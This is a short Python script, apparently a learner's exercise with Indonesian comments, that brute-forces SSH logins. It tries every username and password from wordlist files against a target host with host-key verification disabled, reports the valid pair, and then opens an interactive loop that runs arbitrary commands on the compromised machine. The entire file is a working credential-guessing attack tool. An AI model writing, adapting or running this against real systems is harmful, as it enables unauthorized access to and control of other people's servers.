import sys
import getopt
import paramiko

USERNAMES = []
USERNAME_COUNT = 0
PASSWORDS = []
PASSWORD_COUNT = 0
HOST = ""
PORT = 0

def start_ssh():
    found = False
    client = paramiko.SSHClient()
    for username in USERNAMES:
        for password in PASSWORDS:
            #biar gak ada verifikasi yes or no
            client.set_missing_host_key_policy(
                paramiko.AutoAddPolicy()
            )
            try:
                client.connect(HOST, username=username,password=password,port=PORT, auth_timeout=0.5)
                print("{} and {} combination is valid".format(username,password))
                found = True
                break
            except:
                print("{} and {} combination is invalid".format(username,password))
        if found == True:
            break
    
    while True:
        cmd = input("Insert Command >> ")
        stdin, stdout, stderr = client.exec_command(cmd)
        output = stdout.read()
        print(output.decode('UTF-8'))
                


def main():
    global USERNAMES, USERNAME_COUNT, PASSWORDS, PASSWORD_COUNT,HOST,PORT
    # gak perlu ambil nama filenya jadinya 1: 
    args = sys.argv[1:]
    # print(args)
    # buat shortcut kayak ping "-t"
    #kalau butuh parameter perlu pake :
    opts, _ = getopt.getopt(args, "L:P:th:s:", ["login=", "password=", "host=", "port=", "help"])
    # print(opts)
    for key, value in opts :
        # print("Loginkan si {}".format(value))
        if key == "-L" or key == "--login":
            USERNAMES = read_file(value)
            USERNAME_COUNT = len(USERNAMES)
        elif key == "-P" or key == "--password":
            PASSWORDS = read_file(value)
            PASSWORD_COUNT = len(PASSWORDS)
        elif key == "-h" or key == "--host":
            HOST = value
        elif key == "-s" or key == "--port":
            PORT = int(value)
    start_ssh()
            

def read_file(file_name):
    file = open(file_name)
    #readline buat satu baris
    #readlines itu buat semuanya
    words = file.readlines()
    #map itu buat hapus \n
    #list buat encrypt map object jadi text
    words = list(map(strip_text,words))
    # print(words)
    return words

def strip_text(word):
    return word.strip()
    # print(words)
    

if __name__ == "__main__":
    main()